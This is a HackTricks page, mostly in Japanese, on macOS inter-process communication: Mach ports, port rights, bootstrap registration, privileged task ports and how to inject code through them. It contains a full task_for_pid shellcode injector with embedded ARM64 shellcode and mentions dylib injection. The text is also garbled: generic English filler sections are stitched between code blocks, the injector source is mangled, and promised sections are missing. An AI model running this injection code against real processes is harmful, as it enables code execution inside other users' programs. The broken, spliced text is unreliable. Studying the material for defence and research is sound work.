# macOS IPC - Inter Process Communication

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

## ポートを介したMachメッセージング

### 基本情報

Machはリソースを共有するための**最小単位としてタスク**を使用し、各タスクには**複数のスレッド**が含まれることができます。これらの**タスクとスレッドは、POSIXプロセスとスレッドに1：1でマッピング**されます。

タスク間の通信は、Machプロセス間通信（IPC）を介して行われ、**メッセージはポート間で転送**されます。これらのポートは、カーネルによって管理される**メッセージキューのように機能**します。

各プロセスには**IPCテーブル**があり、そこには**プロセスのMachポート**が見つかります。Machポートの名前は実際には数値（カーネルオブジェクトへのポインタ）です。

プロセスはまた、**別のタスクにポート名と一部の権限を送信**することができ、カーネルはこれを他のタスクの**IPCテーブルにエントリとして表示**します。

### ポート権限

タスクが実行できる操作を定義するポート権限は、この通信に重要です。可能な**ポート権限**は以下の通りです（[ここからの定義](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

* **受信権限**：ポートに送信されたメッセージを受信する権限。MachポートはMPSC（複数のプロデューサー、単一のコンシューマー）キューであり、システム全体で**各ポートにつき1つの受信権限**しか存在できません（複数のプロセスが1つのパイプの読み取り端に対するファイルディスクリプタをすべて保持できるパイプとは異なります）。
* **受信権限を持つタスク**はメッセージを受信し、**送信権限を作成**でき、メッセージを送信できます。元々は**自分のタスクが自分のポートに対して受信権限を持っていました**。
* **送信権限**：ポートにメッセージを送信する権限。
* 送信権限は**クローン**できるため、送信権限を所有するタスクは権限を複製して**第三のタスクに付与**できます。
* **一度だけ送信権限**：ポートに1度だけメッセージを送信し、その後消えます。
* **ポートセット権限**：単一のポートではなく\_ポートセット\_を示します。ポートセットからメッセージをデキューすると、その中に含まれるポートからメッセージをデキューします。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように複数のポートで同時にリッスンするために使用できます。
* **デッドネーム**：実際のポート権限ではなく、単なるプレースホルダーです。ポートが破棄されると、ポートへのすべての既存のポート権限がデッドネームに変わります。

**タスクはSEND権限を他のタスクに転送**して、メッセージを返信できるようにします。**SEND権限はクローン**されるため、タスクは権限を複製して第三のタスクに**付与**できます。これにより、**ブートストラップサーバ**と呼ばれる中間プロセスと組み合わせることで、タスク間の効果的な通信が可能となります。

### ファイルポート

ファイルポートは、Macポート（Machポート権限を使用）でファイルディスクリプタをカプセル化することを可能にします。指定されたFDから`fileport_makeport`を使用して`fileport`を作成し、`fileport_makefd`を使用してファイルポートからFDを作成することができます。

### 通信の確立

#### 手順：

通信チャネルを確立するために、**ブートストラップサーバ**（macでは**launchd**）が関与します。

1. タスク**A**は**新しいポート**を初期化し、プロセス内で**受信権限**を取得します。
2. 受信権限の所有者であるタスク**A**は、ポートに**送信権限を生成**します。
3. タスク**A**は、**ブートストラップサーバ**と**ポートのサービス名**、および**SEND権限**を提供して、**ブートストラップ登録**として知られる手順を通じて**接続**を確立します。
4. タスク**B**は、**サービス**名のブートストラップ**検索**を実行するために**ブートストラップサーバ**とやり取りします。成功すると、**サーバ**はタスクAから受け取った**SEND権限を複製**し、**タスクBに送信**します。
5. SEND権限を取得すると、タスク**B**は**メッセージを作成**して**タスクAに送信**できます。
6. 双方向通信の場合、通常、タスク**B**は**受信権限**と**送信権限を持つ新しいポート**を生成し、**SEND権限をタスクAに渡す**ことで、タスクBにメッセージを送信できるようにします（双方向通信）。

ブートストラップサーバは**サービス名を認証**できません。これは、**タスク**が潜在的に**任意のシステムタスクをなりすます**可能性があることを意味します。例えば、**認証サービス名を偽って**システムタスクをなりすり、その後すべてのリクエストを承認することができます。

その後、Appleは**システム提供のサービス名**を、SIPで保護されたディレクトリにあるセキュアな構成ファイルに保存しています：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。ブートストラップサーバは、これらのサービス名ごとに**受信権限を作成**し、保持します。

これらの事前定義されたサービスについては、**検索プロセスがわずかに異なります**。サービス名が検索されると、launchdはサービスを動的に開始します。新しいワークフローは次のとおりです：

* タスク**B**は、サービス名のブートストラップ**検索**を開始します。
* **launchd**は、タスクが実行されているかどうかをチェックし、実行されていない場合は**開始**します。
* タスク**A**（サービス）は**ブートストラップチェックイン**を実行します。ここで、**ブートストラップ**サーバはSEND権限を作成し、保持し、**受信権限をタスクAに転送**します。
* launchdは**SEND権限を複製**し、タスクBに送信します。
* タスク**B**は**受信権限**と**送信権限**を持つ新しいポートを生成し、**SEND権限をタスクA**（svc）に渡すことで、タスクBにメッセージを送信できるようにします（双方向通信）。

ただし、このプロセスは事前定義されたシステムタスクにのみ適用されます。非システムタスクは引き続き最初に説明されたように動作し、なりすましを許可する可能性があります。

### Machメッセージ

[こちらで詳細を確認](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg`関数は、基本的にシステムコールであり、Machメッセージの送受信に使用されます。この関数は、最初の引数として送信するメッセージを必要とします。このメッセージは、`mach_msg_header_t`構造体で始まり、実際のメッセージコンテンツが続きます。この構造体は次のように定義されています：

```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

プロセスは _**受信権**_ を持つことで Mach ポートでメッセージを受信できます。逆に、**送信者** は _**送信権**_ または _**一度だけ送信権**_ を付与されます。一度だけ送信権は、1回のメッセージ送信後に無効になります。

簡単な **双方向通信** を実現するために、プロセスは **mach メッセージヘッダ** で _返信ポート_ (**`msgh_local_port`**) と呼ばれる mach ポートを指定できます。メッセージの **受信者** はこのメッセージに返信するために使用できます。**`msgh_bits`** のビットフラグを使用して、このポートに対して **一度だけ送信権** が派生および転送されることを示すことができます (`MACH_MSG_TYPE_MAKE_SEND_ONCE`)。

{% hint style="success" %}
XPC メッセージで返信を期待する場合 (`xpc_connection_send_message_with_reply` および `xpc_connection_send_message_with_reply_sync`)、この種の双方向通信が使用されます。ただし、通常は異なるポートが作成され、双方向通信が確立されます。
{% endhint %}

メッセージヘッダの他のフィールドは次のとおりです:

* `msgh_size`: パケット全体のサイズ。
* `msgh_remote_port`: このメッセージが送信されるポート。
* `msgh_voucher_port`: [mach バウチャー](https://robert.sesek.com/2023/6/mach\_vouchers.html)。
* `msgh_id`: 受信者によって解釈されるこのメッセージの ID。

{% hint style="danger" %}
**mach メッセージは \_mach ポート**\_(単一の受信者、複数の送信者通信チャネル) を介して送信されます。複数のプロセスが mach ポートにメッセージを送信できますが、いつでもそのポートから読み取ることができるのは **1つのプロセスだけ** です。
{% endhint %}

### ポートの列挙

```bash
lsmp -p <pid>
```

iOSでこのツールをインストールするには、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) からダウンロードできます。

### コード例

**sender** がポートを**割り当て**、名前 `org.darlinghq.example` の**送信権**を作成し、それを**ブートストラップサーバー**に送信する方法に注目してください。送信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**しました。

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```

### macOS IPC Inter-Process Communication

#### Introduction

In macOS, Inter-Process Communication (IPC) allows communication between processes through various mechanisms such as Mach ports, XPC services, and UNIX domain sockets. Understanding how IPC works is crucial for both developers and security professionals to ensure secure communication between processes.

#### Mach Ports

Mach ports are a fundamental IPC mechanism in macOS, used for communication between processes within the same system or across different systems. Each Mach port has a send right, receive right, or both, which determine the permissions for sending and receiving messages through the port.

#### XPC Services

XPC services are a high-level IPC mechanism provided by the XPC framework in macOS. XPC services allow processes to communicate with each other securely and efficiently. XPC services use Mach ports under the hood for inter-process communication.

#### UNIX Domain Sockets

UNIX domain sockets are another IPC mechanism available in macOS for communication between processes on the same system. UNIX domain sockets use the file system as a communication endpoint, providing a way for processes to exchange data locally.

#### Conclusion

Understanding the different IPC mechanisms in macOS is essential for developing secure applications and conducting security assessments. By leveraging IPC mechanisms effectively, developers can ensure that inter-process communication is secure and reliable. Security professionals can also identify potential vulnerabilities related to IPC and implement appropriate safeguards to protect against exploitation.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```

### 特権ポート

* **ホストポート**: プロセスがこのポートに対して**Send**権限を持っている場合、**システムに関する情報**（例：`host_processor_info`）を取得できます。
* **ホスト特権ポート**: このポートに対して**Send**権限を持つプロセスは、カーネル拡張をロードするなどの**特権アクション**を実行できます。この権限を取得するには、**プロセスはrootである必要があります**。
* さらに、**`kext_request`** APIを呼び出すには、Appleのバイナリにのみ与えられる\*\*`com.apple.private.kext*`\*\*という他の権限が必要です。
* **タスク名ポート**: \_タスクポート\_の権限がないバージョンです。タスクを参照しますが、それを制御することはできません。これを介して利用可能なのは`task_info()`だけです。
* **タスクポート**（別名カーネルポート）\*\*: このポートに対してSend権限があると、タスクを制御できます（メモリの読み書き、スレッドの作成など）。
* 呼び出し`mach_task_self()`を使用して、呼び出し元タスクのためのこのポートの**名前を取得**します。このポートは\*\*`exec()`**を横断してのみ**継承\*\*されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、`exec()`後にもタスクは新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行う際に["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
* これらは、ポートへのアクセス制限です（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
  * アプリが\*\*`com.apple.security.get-task-allow`権限\*\*を持っている場合、**同じユーザーのプロセスがタスクポートにアクセス**できます（デバッグ用にXcodeによって一般的に追加されます）。**ノータリゼーション**プロセスは、本番リリースではこれを許可しません。
  * **`com.apple.system-task-ports`権限を持つアプリケーションは、カーネルを除く任意の**プロセスの**タスクポートを取得**できます。以前のバージョンでは\*\*`task_for_pid-allow`\*\*と呼ばれていました。これはAppleアプリケーションにのみ付与されます。
  * **Rootは、ハード化されたランタイムでコンパイルされていないアプリケーション**のタスクポートにアクセスできます（Apple製品ではないもの）。

### タスクポートを介したスレッドへのシェルコードインジェクション

以下からシェルコードを取得できます：

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```

#### macOS IPC (Inter-Process Communication)

**Introduction**

Inter-Process Communication (IPC) mechanisms are essential for communication between processes on macOS. Understanding how IPC works is crucial for both developers and security professionals to ensure secure communication between processes.

**Types of IPC on macOS**

1. **Mach Messages**: Low-level IPC mechanism used by macOS for inter-process communication.
2. **XPC Services**: Higher-level API built on top of Mach messages, providing a more secure and easier-to-use interface for IPC.
3. **Distributed Objects**: Deprecated IPC mechanism that allowed objects to be passed between processes.

**Security Considerations**

When working with IPC on macOS, it is important to consider the following security aspects:

* **Authentication**: Ensure that processes are authenticated before communicating with each other.
* **Authorization**: Implement proper authorization mechanisms to control which processes can communicate with each other.
* **Data Integrity**: Protect the integrity of data exchanged between processes to prevent tampering.
* **Privacy**: Safeguard sensitive information exchanged via IPC to prevent unauthorized access.

**Privilege Escalation via IPC**

Improperly implemented IPC mechanisms can introduce security vulnerabilities that could be exploited for privilege escalation. Security researchers often look for flaws in IPC implementations to gain elevated privileges on macOS systems.

**Conclusion**

Understanding macOS IPC mechanisms and implementing secure communication practices are essential for building secure applications and preventing privilege escalation attacks.

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```

前のプログラムを**コンパイル**し、同じユーザーでコードをインジェクトできるように**権限**を追加します（そうでない場合は**sudo**を使用する必要があります）。

<details>

<summary>sc_injector.m</summary>

\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector

\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>

\#ifdef **arm64**

kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );

kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );

\#else #include \<mach/mach\_vm.h> #endif

\#define STACK\_SIZE 65536 #define CODE\_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";

int inject(pid\_t pid){

task\_t remoteTask;

// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }

// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }

// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }

// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }

// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;

memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16

const char\* p = (const char\*) remoteCode64;

remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;

printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }

return (0); }

pid\_t pidForProcessName(NSString \*processName) { NSArray \*arguments = @\[@"pgrep", processName]; NSTask \*task = \[\[NSTask alloc] init]; \[task setLaunchPath:@"/usr/bin/env"]; \[task setArguments:arguments];

NSPipe \*pipe = \[NSPipe pipe]; \[task setStandardOutput:pipe];

NSFileHandle \*file = \[pipe fileHandleForReading];

\[task launch];

NSData \*data = \[file readDataToEndOfFile]; NSString \*string = \[\[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid\_t)\[string integerValue]; }

BOOL isStringNumeric(NSString _str) { NSCharacterSet_ nonNumbers = \[\[NSCharacterSet decimalDigitCharacterSet] invertedSet]; NSRange r = \[str rangeOfCharacterFromSet: nonNumbers]; return r.location == NSNotFound; }

int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }

NSString \*arg = \[NSString stringWithUTF8String:argv\[1]]; pid\_t pid;

if (isStringNumeric(arg)) { pid = \[arg intValue]; } else { pid = pidForProcessName(arg); if (pid == 0) { NSLog(@"Error: Process named '%@' not found.", arg); return 1; } else{ printf("Found PID of process '%s': %d\n", \[arg UTF8String], pid); } }

inject(pid); }

return 0; }

````
</details>  

## macOS IPC (Inter-Process Communication)

### Mach Ports

Mach ports are endpoints for inter-process communication in macOS. They are used by processes to send and receive messages. Mach ports are represented by port rights, which are used to perform operations on the ports, such as sending or receiving messages.

### Mach Messages

Mach messages are the units of data exchanged between processes using mach ports. They consist of a header and a body. The header contains information such as the message ID, the size of the message, and the destination port. The body contains the actual data being sent.

### Mach Messages in macOS

In macOS, mach messages are used for various purposes, such as launching applications, managing processes, and communicating between applications. Understanding how mach messages work is essential for analyzing and manipulating inter-process communication on macOS.

### Mach Ports and Security

Since mach ports are a fundamental part of inter-process communication in macOS, securing them is crucial for maintaining system security. Unauthorized access to mach ports can lead to privilege escalation and other security vulnerabilities. It is important to follow best practices for securing mach ports to prevent potential security breaches.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
````

#### タスクポート経由でスレッドにおけるDylibのインジェクション

macOSでは、**スレッド**は**Mach**を使用するか、**posix `pthread` api**を使用して操作される可能性があります。前回のインジェクションで生成したスレッドはMach apiを使用して生成されたため、**posixに準拠していません**。

単純なシェルコードを**インジェクトしてコマンドを実行**することが可能でしたが、これは**posixに準拠する必要がなかった**ため、Machだけで動作する必要がありました。**より複雑なインジェクション**を行うには、スレッドが**posixにも準拠する必要**があります。

したがって、スレッドを**改善する**ためには、**`pthread_create_from_mach_thread`を呼び出すべきです。これにより、有効なpthreadが作成されます。その後、この新しいpthreadはdlopenを呼び出して**システムからdylibを**ロード**することができます。つまり、異なるアクションを実行するための新しいシェルコードを書く代わりに、カスタムライブラリをロードすることが可能です。

例えば、（ログを生成してそれを聞くことができるものなど）**例のdylibs**を以下で見つけることができます：

### macOS IPC (Inter-Process Communication)

#### Mach Ports

Mach ports are endpoints for inter-process communication in macOS. They are used by processes to send and receive messages. Mach ports are referenced by port rights, which are used to control access to the port.

#### XPC Services

XPC (XPC Services) is a lightweight inter-process communication mechanism introduced in macOS. XPC services allow you to create separate processes to handle specific tasks, enhancing the security and stability of the system.

#### Distributed Objects

Distributed Objects is another inter-process communication mechanism in macOS that allows objects to be used across process boundaries. It enables communication between different processes on the same system or across a network.

#### NSXPCConnection

NSXPCConnection is a class in macOS that facilitates communication between processes using XPC. It provides a way to establish a connection and send messages between processes securely.

#### Security Considerations

When working with inter-process communication mechanisms in macOS, it is important to consider security implications. Insecure implementation of IPC can lead to privilege escalation and unauthorized access to sensitive data. Proper access controls and secure coding practices should be followed to mitigate these risks.

```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```

#### タスクポートを介したスレッドハイジャッキング <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

このテクニックでは、プロセスのスレッドがハイジャックされます:

### XPC

#### 基本情報

XPCは、macOSおよびiOSで使用されるカーネルであるXNU間のプロセス間通信を意味し、**プロセス間の通信**のためのフレームワークです。 XPCは、システム上の異なるプロセス間で**安全で非同期なメソッド呼び出しを行うメカニズム**を提供します。これはAppleのセキュリティパラダイムの一部であり、**特権を分離したアプリケーション**の作成を可能にし、各**コンポーネント**が**必要な権限のみ**でジョブを実行するように制限することで、侵害されたプロセスからの潜在的な被害を制限します。

この**通信方法**や**脆弱性**についての詳細については、以下を参照してください:

### MIG - Mach Interface Generator

MIGは、Mach IPCのコード作成プロセスを**簡素化するために作成**されました。基本的には、サーバーとクライアントが指定された定義と通信するために必要なコードを**生成**します。生成されたコードが醜い場合でも、開発者はそれをインポートするだけで、以前よりもはるかにシンプルなコードになります。

詳細については、以下を参照してください:

### 参考文献

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

</details>
